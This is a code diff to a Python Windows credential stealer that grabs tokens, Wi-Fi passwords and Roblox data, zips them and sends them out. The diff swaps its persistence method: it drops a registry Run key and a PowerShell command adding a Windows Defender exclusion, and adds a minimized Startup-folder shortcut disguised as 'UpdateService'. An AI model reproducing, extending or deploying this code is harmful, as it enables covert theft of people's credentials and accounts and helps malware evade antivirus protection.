@@ -1,4 +1,4 @@
-import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES, win32crypt
+import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES, win32crypt, win32com
 from threading import Thread
 
 local = os.getenv('LOCALAPPDATA')
@@ -63,7 +63,7 @@ class main():
 		self.writeRoblox()
 		self.grabwifi()
 
-		if config["Startup"] and not sys.argv[0] == fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename}": self.startup()
+		if config["Startup"]: self.startup()
 
 		self.zipup()
 		self.send()
@@ -114,11 +114,12 @@ class main():
 			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
 
 	def startup(self):
-		try: self.system("powershell Get-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name UpdateService")
-		except:
-			shutil.copytree(os.getcwd(), f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService')
-			self.system(fr"powershell cd C:\; Set-MpPreference -ExclusionPath C:\Users\{os.getlogin()}\Appdata\Microsoft\UpdateService, {os.getcwd()}")
-			self.system(fr"powershell New-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename} -silent' -PropertyType STRING")
+		if not os.path.exists(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.ink"):
+			shell = win32com.client.Dispatch("WScript.Shell")
+			shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.ink")
+			shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
+			shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
+			shortcut.save()
 		
 
 	def get_tokens(self, path):
